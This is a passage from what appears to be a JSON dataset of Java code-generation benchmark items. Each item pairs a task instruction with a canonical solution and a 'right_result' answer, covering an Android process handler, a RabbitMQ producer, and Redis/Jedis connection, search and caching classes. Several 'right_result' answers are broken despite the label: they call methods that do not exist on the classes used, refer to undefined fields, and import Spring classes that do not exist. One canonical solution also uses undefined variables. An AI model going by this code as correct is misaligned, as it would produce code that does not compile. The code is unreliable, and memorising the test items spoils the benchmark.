lInfo.join();\n            if (lWarn != null) lWarn.join();\n        } catch (IOException | InterruptedException e) {\n            Log.e(TAG, \"Failed to execute process or read output\", e);\n        } finally {\n            wakeLock.release();\n        }\n        return capturedStdOut;\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        Process ps = null;\n        DataOutputStream psOut = null;\n        BufferedReader br = null;\n        try {\n            ps = Runtime.getRuntime().exec((mUseRoot) ? \"su\" : \"sh\");\n            psOut = new DataOutputStream(ps.getOutputStream());\n            psOut.writeBytes(\"ps\\n\");\n            psOut.writeBytes(\"exit\\n\");\n            psOut.flush();\n            ps.waitFor();\n            br = new BufferedReader(new InputStreamReader(ps.getInputStream(), \"UTF-8\"));\n            String line;\n            while ((line = br.readLine()) != null) {\n                if (line.contains(processName)) {\n                    String pid = line.trim().split(\"\\\\s+\")[1];\n                    Log.v(TAG, \"getProcessPIDs: Found process PID [\" + pid + \"]\");\n                    pids.add(pid);\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            Log.w(TAG, \"Failed to list processes\", e);\n        } finally {\n            try {\n                if (br != null) br.close();\n                if (psOut != null) psOut.close();\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to close streams\", e);\n            }\n            if (ps != null) ps.destroy();\n        }\n        return pids;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "import android.content.Context;\nimport android.content.SharedPreferences;\nimport android.os.PowerManager;\nimport android.util.Log;\n\nimport java.io.*;\nimport java.util.*;\n\npublic class ProcessHandler {\n    private Context mContext;\n    private boolean mUseRoot;\n    private SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context, boolean useRoot, SharedPreferences preferences) {\n        mContext = context;\n        mUseRoot = useRoot;\n        mPreferences = preferences;\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        if (env != null) {\n            pb.environment().putAll(env);\n        }\n        if (mUseRoot) {\n            List<String> newCommand = new ArrayList<>();\n            newCommand.add(\"su\");\n            newCommand.addAll(Arrays.asList(command));\n            pb.command(newCommand.toArray(new String[0]));\n        }\n        try {\n            return pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    private Thread log(InputStream is, int priority) {\n        return new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    Log.println(priority, \"ProcessHandler\", line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n    }\n\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        PowerManager powerManager = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        WakeLock wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"ProcessHandler:wakeLock\");\n        wakeLock.acquire();\n\n        try {\n            Process process = pb.start();\n            if (returnStdOut) {\n                Thread outputThread = log(process.getInputStream(), Log.INFO);\n                outputThread.start();\n                Thread errorThread = log(process.getErrorStream(), Log.WARN);\n                errorThread.start();\n            }\n\n            int exitCode = process.waitFor();\n            if (returnStdOut) {\n                StringBuilder output = new StringBuilder();\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(line).append(\"\\n\");\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        output.append(line).append(\"\\n\");\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n                return output.toString();\n            } else {\n                return String.valueOf(exitCode);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return e.getMessage();\n        } finally {\n            wakeLock.release();\n        }\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        String[] command = {\"ps\"};\n        if (mUseRoot) {\n            command = new String[]{\"su\", \"ps\"};\n        }\n        try {\n            Process process = setupAndLaunch(null, command);\n            if (process == null) {\n                return pids;\n            }\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.contains(processName)) {\n                    String[] parts = line.split(\"\\\\s+\");\n                    if (parts.length > 0) {\n                        pids.add(parts[0]);\n                    }\n                }\n            }\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                // Handle error\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return pids;\n    }\n}"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a RabbitMQ producer class in Java that can connect to a RabbitMQ broker, send messages to a specified queue, and properly manage resources.\n\nClass Description: The RabbitMQProducer class provides functionality to establish a connection with a RabbitMQ message broker, declare a queue, send messages to that queue, and handle connection cleanup. It supports both single message and batch message sending operations.\n\nAttributes:\n- host: String - The hostname or IP address of the RabbitMQ server\n- port: int - The port number of the RabbitMQ server\n- username: String - The username for authentication with RabbitMQ\n- password: String - The password for authentication with RabbitMQ\n- queueName: String - The name of the queue to send messages to\n- durable: boolean - Whether the queue should survive server restarts\n- connection: Connection - The RabbitMQ connection object\n- channel: Channel - The RabbitMQ channel object for message operations\n\nMethods:\n- RabbitMQProducer(Map<String, String> config) -> void - Constructor that initializes the producer with configuration parameters\n- connect() -> void - Establishes connection to RabbitMQ and creates a channel\n- sendMessage(String message) -> void - Sends a single message to the declared queue\n- sendMessages(String[] messages) -> void - Sends multiple messages to the declared queue\n- close() -> void - Closes the channel and connection to release resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.TimeoutException;\nimport com.rabbitmq.client.ConnectionFactory;\nimport com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.MessageProperties;\n\npublic class RabbitMQProducer {\n\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"rabbitmq_host\");\n        this.port = Integer.parseInt(config.get(\"rabbitmq_port\"));\n        this.username = config.get(\"rabbitmq_user\");\n        this.password = config.get(\"rabbitmq_pass\");\n        this.queueName = config.get(\"rabbitmq_queuename\");\n        this.durable = config.get(\"rabbitmq_durable\").equals(\"true\");\n    }\n\n    public void connect() throws IOException, TimeoutException {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n        connection = factory.newConnection();\n        channel = connection.createChannel();\n        channel.queueDeclare(queueName, durable, false, false, null);\n    }\n\n    public void sendMessage(String message) throws IOException {\n        channel.basicPublish(\"\", queueName, \n            MessageProperties.PERSISTENT_TEXT_PLAIN,\n            message.getBytes()\n        );\n    }\n\n    public void sendMessages(String[] messages) throws IOException {\n        for (String message : messages) {\n            sendMessage(message);\n        }\n    }\n\n    public void close() throws IOException, TimeoutException {\n        if (channel != null && channel.isOpen()) {\n            channel.close();\n        }\n        if (connection != null && connection.isOpen()) {\n            connection.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 40,
    "right_result": "import com.rabbitmq.client.Connection;\nimport com.rabbitmq.client.Channel;\nimport com.rabbitmq.client.ConnectionFactory;\nimport java.util.Map;\n\npublic class RabbitMQProducer {\n    private String host;\n    private int port;\n    private String username;\n    private String password;\n    private String queueName;\n    private boolean durable;\n    private Connection connection;\n    private Channel channel;\n\n    public RabbitMQProducer(Map<String, String> config) {\n        this.host = config.get(\"host\");\n        this.port = Integer.parseInt(config.get(\"port\"));\n        this.username = config.get(\"username\");\n        this.password = config.get(\"password\");\n        this.queueName = config.get(\"queueName\");\n        this.durable = Boolean.parseBoolean(config.get(\"durable\"));\n    }\n\n    public void connect() {\n        ConnectionFactory factory = new ConnectionFactory();\n        factory.setHost(host);\n        factory.setPort(port);\n        factory.setUsername(username);\n        factory.setPassword(password);\n\n        try {\n            connection = factory.newConnection();\n            channel = connection.createChannel();\n            channel.queueDeclare(queueName, durable, false, false, null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String message) {\n        try {\n            channel.basicPublish(\"\", queueName, null, message.getBytes());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessages(String[] messages) {\n        for (String message : messages) {\n            sendMessage(message);\n        }\n    }\n\n    public void close() {\n        try {\n            if (channel != null) channel.close();\n            if (connection != null) connection.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing methods to establish, close, and create new connections with configurable protocols.\n\nClass Description: The RedisConnectionManager class handles Redis connection management using Jedis, allowing for protocol configuration and providing essential connection operations. It encapsulates connection details and offers methods for connection lifecycle management.\n\nAttributes:\n\nendpoint: [EndpointConfig] - Configuration for Redis connection endpoint (host, port, etc.)\nprotocol: [RedisProtocol] - The Redis protocol to be used for connections\njedis: [Jedis] - The Jedis client instance for Redis operations\n\nMethods:\n\nsetUpConnection: [void]() -> [void] - Establishes a new Redis connection with the configured protocol and timeout, and flushes all existing data\ncloseConnection: [void]() -> [void] - Closes the current Redis connection and releases resources\ncreateNewConnection: [Jedis]() -> [Jedis] - Creates and returns a new Jedis connection instance with the configured protocol",
    "Canonical_solution": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.HostAndPorts;\nimport redis.clients.jedis.RedisProtocol;\nimport redis.clients.jedis.EndpointConfig;\n\npublic class RedisConnectionManager {\n\n    protected static final EndpointConfig endpoint = HostAndPorts.getRedisEndpoint(\"standalone0\");\n    protected final RedisProtocol protocol;\n    protected Jedis jedis;\n\n    public RedisConnectionManager(RedisProtocol protocol) {\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() throws Exception {\n        jedis = new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).timeoutMillis(500).build());\n        jedis.flushAll();\n    }\n\n    public void closeConnection() throws Exception {\n        jedis.close();\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHostAndPort(), endpoint.getClientConfigBuilder()\n            .protocol(protocol).build());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.Jedis;\nimport com.example.EndpointConfig;\nimport com.example.RedisProtocol;\n\npublic class RedisConnectionManager {\n    private EndpointConfig endpoint;\n    private RedisProtocol protocol;\n    private Jedis jedis;\n\n    public RedisConnectionManager(EndpointConfig endpoint, RedisProtocol protocol) {\n        this.endpoint = endpoint;\n        this.protocol = protocol;\n    }\n\n    public void setUpConnection() {\n        if (jedis != null) {\n            jedis.close();\n        }\n        jedis = new Jedis(endpoint.getHost(), endpoint.getPort(), protocol.getTimeout());\n    }\n\n    public void closeConnection() {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n\n    public Jedis createNewConnection() {\n        return new Jedis(endpoint.getHost(), endpoint.getPort(), protocol.getTimeout());\n    }\n}"
  },
  {
    "Task_id": 311,
    "Instruction": "Task Description: Create a Java class that manages Redis connections using the Jedis client library, providing functionality for connection establishment, credential updates, and resource cleanup.\n\nClass Description: The RedisConnectionManager class encapsulates Redis connection management using JedisPooled for connection pooling. It handles authentication, provides access to the Jedis instance, allows credential updates, and ensures proper resource cleanup.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis connection instance\n- credentialsProvider: DefaultRedisCredentialsProvider - Provider for Redis authentication credentials\n\nMethods:\n- RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) -> void - Constructor that initializes the Redis connection with host, port, and initial credentials\n- updateCredentials(String updatedUsername, String updatedPassword) -> void - Updates the authentication credentials for the Redis connection\n- getJedisInstance() -> JedisPooled - Returns the managed JedisPooled instance for Redis operations\n- closeConnection() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.DefaultRedisCredentials;\nimport redis.clients.jedis.DefaultRedisCredentialsProvider;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisPooled;\n\npublic class RedisConnectionManager {\n\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        DefaultRedisCredentials initialCredentials = new DefaultRedisCredentials(initialUsername, initialPassword);\n        this.credentialsProvider = new DefaultRedisCredentialsProvider(initialCredentials);\n        HostAndPort address = new HostAndPort(host, port);\n        DefaultJedisClientConfig clientConfig = DefaultJedisClientConfig.builder()\n                .credentialsProvider(credentialsProvider).build();\n        this.jedis = new JedisPooled(address, clientConfig);\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        DefaultRedisCredentials updatedCredentials = new DefaultRedisCredentials(updatedUsername, updatedPassword);\n        credentialsProvider.setCredentials(updatedCredentials);\n    }\n\n    public JedisPooled getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.Jedis;\n\npublic class RedisConnectionManager {\n    private JedisPooled jedis;\n    private DefaultRedisCredentialsProvider credentialsProvider;\n\n    public RedisConnectionManager(String host, int port, String initialUsername, String initialPassword) {\n        credentialsProvider = new DefaultRedisCredentialsProvider();\n        credentialsProvider.setUsername(initialUsername);\n        credentialsProvider.setPassword(initialPassword);\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        jedis = new JedisPooled(poolConfig, host, port);\n        Jedis jedisInstance = jedis.getResource();\n        jedisInstance.auth(credentialsProvider.getUsername(), credentialsProvider.getPassword());\n    }\n\n    public void updateCredentials(String updatedUsername, String updatedPassword) {\n        if (jedis != null) {\n            jedis.close();\n        }\n        credentialsProvider.setUsername(updatedUsername);\n        credentialsProvider.setPassword(updatedPassword);\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        jedis = new JedisPooled(poolConfig, host, port);\n        Jedis jedisInstance = jedis.getResource();\n        jedisInstance.auth(credentialsProvider.getUsername(), credentialsProvider.getPassword());\n    }\n\n    public JedisPooled getJedisInstance() {\n        return jedis;\n    }\n\n    public void closeConnection() {\n        if (jedis != null) {\n            jedis.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 317,
    "Instruction": "Task Description: Create a Java class that provides a client interface for interacting with Redis Search functionality, including index creation, document management, search operations, and aggregation.\n\nClass Description: The RedisSearchClient class encapsulates Redis Search operations using the Jedis client library. It manages a connection to Redis and provides methods for creating search indexes, adding JSON documents, performing searches, and running aggregations.\n\nAttributes:\n- jedis: JedisPooled - The pooled Redis client connection used for all operations\n\nMethods:\n- RedisSearchClient(String host, int port) -> void - Constructor that initializes the Redis connection with the specified host and port\n- createIndex(String indexName, String prefix, SchemaField[] schema) -> void - Creates a new search index with the given name, prefix, and schema definition\n- addDocument(String key, Object document) -> void - Adds a JSON document to Redis with the specified key\n- search(String indexName, Query query) -> List<Document> - Performs a search query on the specified index and returns matching documents\n- aggregate(String indexName, AggregationBuilder aggregationBuilder) -> AggregationResult - Executes an aggregation query on the specified index and returns the results\n- close() -> void - Closes the Redis connection and releases resources",
    "Canonical_solution": "import redis.clients.jedis.JedisPooled;\nimport redis.clients.jedis.search.*;\nimport redis.clients.jedis.search.aggr.*;\nimport redis.clients.jedis.search.schemafields.*;\n\npublic class RedisSearchClient {\n\n    private JedisPooled jedis;\n\n    public RedisSearchClient(String host, int port) {\n        this.jedis = new JedisPooled(host, port);\n    }\n\n    public void createIndex(String indexName, String prefix, SchemaField[] schema) {\n        jedis.ftCreate(indexName,\n            FTCreateParams.createParams()\n                .on(IndexDataType.JSON)\n                .addPrefix(prefix),\n            schema\n        );\n    }\n\n    public void addDocument(String key, Object document) {\n        jedis.jsonSetWithEscape(key, document);\n    }\n\n    public List<Document> search(String indexName, Query query) {\n        return jedis.ftSearch(indexName, query).getDocuments();\n    }\n\n    public AggregationResult aggregate(String indexName, AggregationBuilder aggregationBuilder) {\n        return jedis.ftAggregate(indexName, aggregationBuilder);\n    }\n\n    public void close() {\n        jedis.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport org.json.JSONObject;\nimport java.util.List;\nimport java.util.Map;\n\npublic class RedisSearchClient {\n    private JedisPool jedis;\n\n    public RedisSearchClient(String host, int port) {\n        this.jedis = new JedisPool(new JedisPoolConfig(), host, port);\n    }\n\n    public void createIndex(String indexName, String prefix, SchemaField[] schema) {\n        String fullIndexName = prefix + \":\" + indexName;\n        StringBuilder schemaStr = new StringBuilder();\n        for (SchemaField field : schema) {\n            schemaStr.append(\" FIELD \").append(field.getName()).append(\" \").append(field.getType());\n        }\n        jedis.ftCreate(fullIndexName, \"ON\", \"json\", schemaStr.toString());\n    }\n\n    public void addDocument(String key, Object document) {\n        String jsonDoc = new JSONObject(document).toString();\n        jedis.ftAdd(key, jsonDoc);\n    }\n\n    public List<Document> search(String indexName, Query query) {\n        String queryString = query.toString();\n        return jedis.ftSearch(indexName, queryString);\n    }\n\n    public AggregationResult aggregate(String indexName, AggregationBuilder aggregationBuilder) {\n        String aggregationStr = aggregationBuilder.toString();\n        return jedis.ftAggregate(indexName, aggregationStr);\n    }\n\n    public void close() {\n        jedis.close();\n    }\n}"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with token-based authentication for multiple users.\n\nClass Description: The RedisConnectionManager class provides functionality to establish and manage Redis connections (both standalone and cluster) using token-based authentication. It supports multiple authentication credentials and configures connection options like timeouts and reauthentication behavior.\n\nAttributes:\n- redisClient: RedisClient - The client for standalone Redis connections\n- redisClusterClient: RedisClusterClient - The client for Redis cluster connections\n- credentialsUser1: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 1\n- credentialsUser2: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 2\n\nMethods:\n- RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) -> void - Constructor that initializes the connection manager with Redis URI, authentication authority, scopes, and credentials for two users\n- createStandaloneConnection() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user1 credentials\n- createStandaloneConnectionWithUser2() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user2 credentials\n- createClusterConnection() -> StatefulRedisClusterConnection<String, String> - Creates and returns a Redis cluster connection\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import io.lettuce.authx.TokenBasedRedisCredentialsProvider;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.cluster.api.sync.NodeSelection;\nimport io.lettuce.core.cluster.api.sync.RedisAdvancedClusterCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, \n                                String user1ClientId, String user1Secret, \n                                String user2ClientId, String user2Secret) {\n        IdentityProviderConfig config1;\n        try (EntraIDTokenAuthConfigBuilder builder = EntraIDTokenAuthConfigBuilder.builder()) {\n            config1 = builder.authority(authority).clientId(user1ClientId).secret(user1Secret).scopes(scopes)\n                    .tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        }\n\n        TokenAuthConfig tokenAuthConfigUser1 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config1).build();\n        credentialsUser1 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser1);\n\n        IdentityProviderConfig config2 = EntraIDTokenAuthConfigBuilder.builder().authority(authority).clientId(user2ClientId)\n                .secret(user2Secret).scopes(scopes).tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        TokenAuthConfig tokenAuthConfigUser2 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config2).build();\n        credentialsUser2 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser2);\n\n        RedisURI redisURI1 = RedisURI.create(redisUri);\n        redisURI1.setCredentialsProvider(credentialsUser1);\n\n        RedisURI redisURI2 = RedisURI.create(redisUri);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClient = RedisClient.create(redisURI1);\n        redisClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect(StringCodec.UTF8);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        RedisURI redisURI2 = RedisURI.create(REDIS_URI);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n        return redisClient.connect(StringCodec.UTF8, redisURI2);\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        ClusterClientOptions clusterClientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClusterClient = RedisClusterClient.create(redisURI1);\n        redisClusterClient.setOptions(clusterClientOptions);\n        return redisClusterClient.connect(StringCodec.UTF8);\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n        if (credentialsUser1 != null) {\n            credentialsUser1.close();\n        }\n        if (credentialsUser2 != null) {\n            credentialsUser2.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import org.springframework.data.redis.core.RedisClient;\nimport org.springframework.data.redis.core.RedisClusterClient;\nimport org.springframework.data.redis.core.StatefulRedisConnection;\nimport org.springframework.data.redis.core.StatefulRedisClusterConnection;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory;\nimport org.springframework.data.redis.connection.lettuce.LettuceConnection;\nimport org.springframework.data.redis.core.TokenBasedRedisCredentialsProvider;\n\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) {\n        credentialsUser1 = new TokenBasedRedisCredentialsProvider(user1ClientId, user1Secret);\n        credentialsUser2 = new TokenBasedRedisCredentialsProvider(user2ClientId, user2Secret);\n\n        RedisURI uri = RedisURI.create(redisUri);\n        redisClient = RedisClient.create(uri);\n        redisClient.setCredentialsProvider(credentialsUser1);\n\n        redisClusterClient = RedisClusterClient.create(uri);\n        redisClusterClient.setCredentialsProvider(credentialsUser1);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        RedisClient client = RedisClient.create(redisClusterClient.getUri());\n        client.setCredentialsProvider(credentialsUser2);\n        return client.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return redisClusterClient.connect();\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.close();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Implement a Redis data access object (DAO) class in Java that provides functionality for caching and retrieving Seckill objects using Redis as the storage backend. The class should handle connection management, serialization/deserialization, and implement a cache-aside pattern with distributed locking.\n\nClass Description: RedisDao is a Java class that interacts with Redis to store and retrieve Seckill objects. It uses Jedis as the Redis client, Protostuff for serialization, and implements distributed locking for thread-safe operations.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- schema: RuntimeSchema<Seckill> - The Protostuff schema for Seckill object serialization\n\nMethods:\n- RedisDao(String ip, int port) -> void - Constructor that initializes the JedisPool with given Redis server IP and port\n- getSeckill(long seckillId) -> Seckill - Retrieves a Seckill object from Redis by its ID\n- getSeckill(long seckillId, Jedis jedis) -> Seckill - Retrieves a Seckill object from Redis using an existing Jedis connection\n- getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) -> Seckill - Implements cache-aside pattern with distributed locking, fetching from DB if not in cache\n- putSeckill(Seckill seckill) -> String - Stores a Seckill object in Redis with default expiration\n- putSeckill(Seckill seckill, Jedis jedis) -> String - Stores a Seckill object in Redis using an existing Jedis connection\n- getSeckillRedisKey(long seckillId) -> String - Helper method to generate Redis key for a Seckill object",
    "Canonical_solution": "import cn.codingxiaxw.entity.Seckill;\nimport cn.codingxiaxw.utils.JedisUtils;\nimport com.dyuproject.protostuff.LinkedBuffer;\nimport com.dyuproject.protostuff.ProtostuffIOUtil;\nimport com.dyuproject.protostuff.runtime.RuntimeSchema;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.UUID;\nimport java.util.function.Function;\n\npublic class RedisDao {\n    private final JedisPool jedisPool;\n    private RuntimeSchema<Seckill> schema = RuntimeSchema.createFrom(Seckill.class);\n\n    public RedisDao(String ip, int port) {\n        jedisPool = new JedisPool(ip, port);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        return getSeckill(seckillId, null);\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckillId);\n                byte[] bytes = jedis.get(key.getBytes());\n                if (bytes != null) {\n                    Seckill seckill = schema.newMessage();\n                    ProtostuffIOUtil.mergeFrom(bytes, seckill, schema);\n                    return seckill;\n                }\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        String lockKey = \"seckill:locks:getSeckill:\" + seckillId;\n        String lockRequestId = UUID.randomUUID().toString();\n        Jedis jedis = jedisPool.getResource();\n\n        try {\n            while (true) {\n                Seckill seckill = getSeckill(seckillId, jedis);\n                if (seckill != null) {\n                    return seckill;\n                }\n                boolean getLock = JedisUtils.tryGetDistributedLock(jedis, lockKey, lockRequestId, 1000);\n                if (getLock) {\n                    seckill = getDataFromDb.apply(seckillId);\n                    putSeckill(seckill, jedis);\n                    return seckill;\n                }\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        } catch (Exception ignored) {\n        } finally {\n            JedisUtils.releaseDistributedLock(jedis, lockKey, lockRequestId);\n            jedis.close();\n        }\n        return null;\n    }\n\n    public String putSeckill(Seckill seckill) {\n        return putSeckill(seckill, null);\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckill.getSeckillId());\n                byte[] bytes = ProtostuffIOUtil.toByteArray(seckill, schema,\n                        LinkedBuffer.allocate(LinkedBuffer.DEFAULT_BUFFER_SIZE));\n                int timeout = 60 * 60;\n                return jedis.setex(key.getBytes(), timeout, bytes);\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    private String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
